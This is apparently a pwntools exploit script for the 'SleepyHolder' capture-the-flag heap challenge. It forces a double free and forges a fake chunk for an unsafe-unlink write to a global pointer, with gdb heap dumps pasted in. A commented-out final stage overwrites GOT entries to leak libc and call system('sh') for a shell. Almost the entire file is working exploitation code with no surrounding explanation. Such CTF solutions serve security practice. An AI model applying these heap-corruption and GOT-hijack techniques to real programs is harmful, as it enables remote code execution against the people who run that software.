#!/usr/bin/env python
# encoding: utf8
from pwn import *

context.terminal = ['tmux', 'splitw', '-v']
context.log_level = 'debug'

io = gdb.debug('./SleepyHolder', '''
source /home/ubuntu/.gdbinit-gef.py
source ./helper.py

set verbose on
set print pretty on

gef config context.layout "memory"

continue
''')

SMALL = 1
BIG = 2
HUGE = 3

def add(t, s):
    io.recvuntil('3. Renew secret\n')
    io.sendline('1')
    io.recvuntil('Big secret\n')
    io.sendline(str(t))
    io.recvuntil(': \n')
    io.send(s)

def delete(t):
    io.recvuntil('3. Renew secret\n')
    io.sendline('2')
    io.recvuntil('Big secret\n')
    io.sendline(str(t))

def update(t, s):
    io.recvuntil('3. Renew secret\n')
    io.sendline('3')
    io.recvuntil('Big secret\n')
    io.sendline(str(t))
    io.recvuntil(': \n')
    io.send(s)

if __name__ == "__main__":
    system_offset = 0x45390

    add(SMALL, 'SMALL')

    add(BIG, 'BIG')

    delete(SMALL)

    add(HUGE, 'HUGE')

    delete(SMALL)

    f_ptr = 0x6020d0
    add(SMALL,
        p64(0x0000000000000000) +
        p64(0x0000000000000021) +
        p64(f_ptr - 0x18) +
        p64(f_ptr - 0x10) +
        p8(0x20))
    '''
    gef➤  p *(struct malloc_chunk *) 0x0000000001d895f0
    $1 = {
      prev_size = 0x0,
      size = 0x21,
      fd = 0x6020b8,
      bk = 0x6020c0,
      fd_nextsize = 0x20,
      bk_nextsize = 0xfb0
    }
    '''

    delete(BIG)

    '''
    gef➤  p *(struct malloc_chunk *) 0x1b7fe90
    $1 = {
      prev_size = 0x0,
      size = 0x20171,
      fd = 0x6020b8,
      bk = 0x6020c0,
      fd_nextsize = 0x20,
      bk_nextsize = 0xfb0
    }
    '''

# delete(2)


# atoi_GOT = 0x602080
# free_GOT = 0x602018
# puts_GOT = 0x602020
# puts_plt = 0x400760
# atoi_offset = 0x36e70
# system_offset = 0x45390
#
# f = p64(0)
# f += p64(atoi_GOT) + p64(puts_GOT) + p64(free_GOT)
# f += p32(1)*3
# update(1, f)
# update(1, p64(puts_plt))
# delete(2)
# s = io.recv(6)
# libc_base = u64(s.ljust(8, '\x00')) - atoi_offset
# system = libc_base + system_offset
# update(1, p64(system))
# add(2, 'sh\0')
# delete(2)


io.interactive()


